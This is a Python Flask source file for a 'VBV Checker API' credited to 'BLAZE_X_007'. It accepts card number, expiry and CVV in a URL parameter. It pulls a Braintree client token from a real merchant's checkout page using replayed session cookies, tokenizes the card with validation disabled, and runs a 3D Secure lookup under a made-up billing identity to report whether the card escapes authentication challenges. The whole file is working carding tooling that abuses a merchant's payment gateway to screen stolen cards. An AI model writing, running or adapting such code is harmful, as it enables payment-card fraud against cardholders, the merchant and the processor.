from flask import Flask, request, jsonify
import requests
import re
import base64
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_bin_info(bin_number):
    """Get BIN information from antipublic.cc API"""
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        bin_data = response.json()
        
        # Format the BIN information in a clean way
        formatted_bin_info = {
            'bin': bin_data.get('bin', bin_number),
            'vendor': bin_data.get('vendor', 'Unknown'),
            'type': bin_data.get('type', 'Unknown'),
            'level': bin_data.get('level', 'Unknown'),
            'bank': bin_data.get('bank', 'Unknown'),
            'country': bin_data.get('country', 'Unknown'),
            'country_info': bin_data.get('country_info', 'Unknown'),
            'bank_website': bin_data.get('bank_website', 'Unknown'),
            'bank_phone': bin_data.get('bank_phone', 'Unknown'),
            'valid': bin_data.get('valid', False)
        }
        
        return formatted_bin_info, None
        
    except requests.exceptions.RequestException as e:
        return None, f"BIN API error: {str(e)}"
    except Exception as e:
        return None, f"Error getting BIN info: {str(e)}"

def get_client_token():
    """Get Braintree client token from xlifter.com"""
    cookies = {
        'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
        'wmc_current_currency': 'EUR',
        'wmc_current_currency_old': 'EUR',
        'wp_woocommerce_session_c8b09fd6a66f1378f0ed5a3909218785': 't_8d207563a5f105d8499fdcf4f5a887%7C1764399234%7C1764312834%7C%24generic%24D6NyqUApl44ZKzJCeN9c4GNm61mtwGxQ0Gt035Fc',
        'cmplz_consented_services': '',
        'cmplz_policy_id': '37',
        'cmplz_marketing': 'allow',
        'cmplz_statistics': 'allow',
        'cmplz_preferences': 'allow',
        'cmplz_functional': 'allow',
        'cmplz_banner-status': 'dismissed',
        '_ga': 'GA1.1.480019427.1764226438',
        '_fbp': 'fb.1.1764226438173.435378032875134316',
        'et-editor-available-post-633-fb': 'fb',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-11-27%2006%3A31%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcart%2F',
        'sbjs_first_add': 'fd%3D2025-11-27%2006%3A31%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcart%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'c6b9602f0b5218735a0378908f5cccdd',
        '_ga_G5EET4Q5MQ': 'GS2.1.s1764226437$o1$g1$t1764226923$j34$l0$h0',
        '_gcl_au': '1.1.1507767560.1764226437.1720276993.1764226641.1764226976',
    }

    headers = {
        'authority': 'www.xlifter.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.xlifter.com/cart/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.get('https://www.xlifter.com/checkout-page/', cookies=cookies, headers=headers, timeout=30)
        response.raise_for_status()
        
        wiz = response.text.find('wc_braintree_client_token = ["')
        if wiz == -1:
            return None, "Client token not found in response"
            
        wiz1 = response.text.find('"]', wiz)
        if wiz1 == -1:
            return None, "Client token end marker not found"
            
        encoded_text = response.text[wiz + 30:wiz1]
        if not encoded_text:
            return None, "Encoded token is empty"
            
        decode_text = base64.b64decode(encoded_text).decode('utf-8')
        wizard = re.findall('"authorizationFingerprint":"(.*?)"', decode_text)
        
        if not wizard:
            return None, "Authorization fingerprint not found"
            
        return wizard[0], None
        
    except Exception as e:
        return None, f"Error getting client token: {str(e)}"

def tokenize_credit_card(authorization_fingerprint, card_data):
    """Tokenize credit card using Braintree GraphQL"""
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'authorization': f'Bearer {authorization_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'e5256d53-e797-4f6c-81ab-1934222cc154',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_data['number'],
                    'expirationMonth': card_data['month'],
                    'expirationYear': card_data['year'],
                    'cvv': card_data['cvv'],
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
        response.raise_for_status()
        
        data = response.json()
        if 'data' in data and 'tokenizeCreditCard' in data['data']:
            return data['data']['tokenizeCreditCard']['token'], None
        else:
            return None, "Tokenization failed - no token in response"
            
    except Exception as e:
        return None, f"Error tokenizing card: {str(e)}"

def three_d_secure_lookup(authorization_fingerprint, token, bin_number):
    """Perform 3D Secure lookup to check VBV status"""
    headers = {
        'authority': 'api.braintreegateway.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.xlifter.com',
        'referer': 'https://www.xlifter.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'amount': '585.00',
        'browserColorDepth': 24,
        'browserJavaEnabled': False,
        'browserJavascriptEnabled': True,
        'browserLanguage': 'en-GB',
        'browserScreenHeight': 804,
        'browserScreenWidth': 360,
        'browserTimeZone': -330,
        'deviceChannel': 'Browser',
        'additionalInfo': {
            'shippingGivenName': 'Wiz',
            'shippingSurname': 'Ff',
            'ipAddress': '122.172.78.201',
            'billingLine1': 'NY',
            'billingLine2': 'NY',
            'billingCity': 'NY',
            'billingState': 'NY',
            'billingPostalCode': '10080',
            'billingCountryCode': 'US',
            'billingPhoneNumber': '3542268895',
            'billingGivenName': 'Wiz',
            'billingSurname': 'Ff',
            'shippingLine1': 'NY',
            'shippingLine2': 'NY',
            'shippingCity': 'NY',
            'shippingState': 'NY',
            'shippingPostalCode': '10080',
            'shippingCountryCode': 'US',
            'email': 'wizardlyaura999@gmail.com',
        },
        'bin': bin_number,
        'dfReferenceId': '0_3e9470ab-e16a-416e-9ac9-aa46e66a12ac',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.133.0',
            'cardinalDeviceDataCollectionTimeElapsed': 16,
            'issuerDeviceDataCollectionTimeElapsed': 5494,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': authorization_fingerprint,
        'braintreeLibraryVersion': 'braintree/web/3.133.0',
        '_meta': {
            'merchantAppId': 'www.xlifter.com',
            'platform': 'web',
            'sdkVersion': '3.133.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '5128134e-36d3-4fdb-91f2-96bdfeae902a',
        },
    }

    try:
        response = requests.post(
            f'https://api.braintreegateway.com/merchants/8mw6d8gxn9cmjh8t/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
            timeout=30
        )
        response.raise_for_status()
        return response.json(), None
        
    except Exception as e:
        return None, f"Error in 3D Secure lookup: {str(e)}"

def determine_vbv_status(lookup_response):
    """Determine VBV status from 3D Secure lookup response"""
    if not lookup_response:
        return "Error: No response received"
    
    # Check for authentication status in the response
    if 'threeDSecureInfo' in lookup_response:
        three_d_info = lookup_response['threeDSecureInfo']
        
        if 'liabilityShifted' in three_d_info:
            if three_d_info['liabilityShifted']:
                return "Authenticate Successful"
            else:
                return "Challenge Required"
        
        if 'status' in three_d_info:
            status = three_d_info['status']
            if status == 'authenticate_successful':
                return "Authenticate Successful"
            elif status == 'challenge_required':
                return "Challenge Required"
            elif status == 'authenticate_attempt_successful':
                return "Authenticate Attempt Successful"
            elif status == 'authentication_unavailable':
                return "Authentication Unavailable"
    
    # Fallback based on common patterns
    if 'error' in lookup_response:
        error_message = str(lookup_response['error']).lower()
        if 'challenge' in error_message:
            return "Challenge Required"
        elif 'authentication' in error_message:
            return "Authenticate Attempt Successful"
    
    return "Unknown Status - Non VBV"

@app.route('/gateway', methods=['GET'])
def check_vbv():
    """Main endpoint for VBV checking with BIN information"""
    # Get query parameters
    key = request.args.get('key')
    card = request.args.get('card')
    bin_param = request.args.get('bin')
    
    # Validate API key
    if key != 'blazedev':
        return jsonify({
            'status': 'error',
            'message': 'Invalid API key',
            'developer': 'BLAZE_X_007'
        }), 401
    
    # Validate card parameter
    if not card:
        return jsonify({
            'status': 'error',
            'message': 'Card parameter is required. Format: cc_number|mm|yy|cvv',
            'developer': 'BLAZE_X_007'
        }), 400
    
    # Parse card data
    try:
        card_parts = card.split('|')
        if len(card_parts) != 4:
            raise ValueError("Invalid card format")
        
        card_data = {
            'number': card_parts[0].strip(),
            'month': card_parts[1].strip(),
            'year': card_parts[2].strip(),
            'cvv': card_parts[3].strip()
        }
        
        # Validate card number length
        if len(card_data['number']) < 13 or len(card_data['number']) > 19:
            raise ValueError("Invalid card number length")
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Invalid card format: {str(e)}. Use: cc_number|mm|yy|cvv',
            'developer': 'BLAZE_X_007'
        }), 400
    
    # Get BIN (first 6 digits of card number)
    bin_number = card_data['number'][:6]
    if bin_param:
        bin_number = bin_param
    
    logger.info(f"Processing VBV check for BIN: {bin_number}")
    
    try:
        # Get BIN information first
        bin_info, bin_error = get_bin_info(bin_number)
        if bin_error:
            logger.warning(f"BIN info error: {bin_error}")
            bin_info = {
                'bin': bin_number,
                'vendor': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'bank': 'Unknown',
                'country': 'Unknown',
                'country_info': 'Unknown',
                'bank_website': 'Unknown',
                'bank_phone': 'Unknown',
                'valid': False,
                'error': bin_error
            }
        
        # Step 1: Get client token
        authorization_fingerprint, error = get_client_token()
        if error:
            return jsonify({
                'status': 'error',
                'message': error,
                'bin_info': bin_info,
                'developer': 'BLAZE_X_007'
            }), 500
        
        logger.info("Successfully obtained client token")
        
        # Step 2: Tokenize credit card
        token, error = tokenize_credit_card(authorization_fingerprint, card_data)
        if error:
            return jsonify({
                'status': 'error',
                'message': error,
                'bin_info': bin_info,
                'developer': 'BLAZE_X_007'
            }), 500
        
        logger.info("Successfully tokenized credit card")
        
        # Step 3: Perform 3D Secure lookup
        lookup_response, error = three_d_secure_lookup(authorization_fingerprint, token, bin_number)
        if error:
            return jsonify({
                'status': 'error',
                'message': error,
                'bin_info': bin_info,
                'developer': 'BLAZE_X_007'
            }), 500
        
        logger.info("Successfully performed 3D Secure lookup")
        
        # Step 4: Determine VBV status
        vbv_status = determine_vbv_status(lookup_response)
        
        # Prepare response
        response_data = {
            'status': 'success',
            'bin': bin_number,
            'bin_info': bin_info,
            'vbv_status': vbv_status,
            'card_details': {
                'first_6': card_data['number'][:6],
                'last_4': card_data['number'][-4:],
                'expiry': f"{card_data['month']}/{card_data['year']}",
                'length': len(card_data['number'])
            },
            'full_response': lookup_response,
            'developer': 'BLAZE_X_007'
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)}',
            'bin': bin_number,
            'developer': 'BLAZE_X_007'
        }), 500

@app.route('/bin/<bin_number>', methods=['GET'])
def get_bin_details(bin_number):
    """Endpoint to get BIN information only"""
    key = request.args.get('key')
    
    # Validate API key
    if key != 'blazedev':
        return jsonify({
            'status': 'error',
            'message': 'Invalid API key',
            'developer': 'BLAZE_X_007'
        }), 401
    
    # Validate BIN number
    if not bin_number or len(bin_number) < 6 or not bin_number.isdigit():
        return jsonify({
            'status': 'error',
            'message': 'Invalid BIN number. Must be at least 6 digits',
            'developer': 'BLAZE_X_007'
        }), 400
    
    try:
        bin_info, error = get_bin_info(bin_number)
        if error:
            return jsonify({
                'status': 'error',
                'message': error,
                'bin': bin_number,
                'developer': 'BLAZE_X_007'
            }), 500
        
        return jsonify({
            'status': 'success',
            'bin_info': bin_info,
            'developer': 'BLAZE_X_007'
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)}',
            'bin': bin_number,
            'developer': 'BLAZE_X_007'
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'VBV Checker API with BIN Lookup',
        'developer': 'BLAZE_X_007'
    })

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        'message': 'VBV Checker API with BIN Lookup - BLAZE_X_007',
        'endpoints': {
            '/gateway': {
                'description': 'Check VBV status with BIN information',
                'parameters': {
                    'key': 'API key (required)',
                    'card': 'Card details in format: cc_number|mm|yy|cvv (required)',
                    'bin': 'BIN number (optional, will use first 6 digits of card if not provided)'
                },
                'example': '/gateway?key=blazedev&card=4635747880574554|09|2029|534'
            },
            '/bin/{bin_number}': {
                'description': 'Get BIN information only',
                'parameters': {
                    'key': 'API key (required)',
                    'bin_number': '6+ digit BIN number (in URL path)'
                },
                'example': '/bin/463574?key=blazedev'
            },
            '/health': {
                'description': 'Health check endpoint'
            }
        },
        'developer': 'BLAZE_X_007'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3030, debug=False)
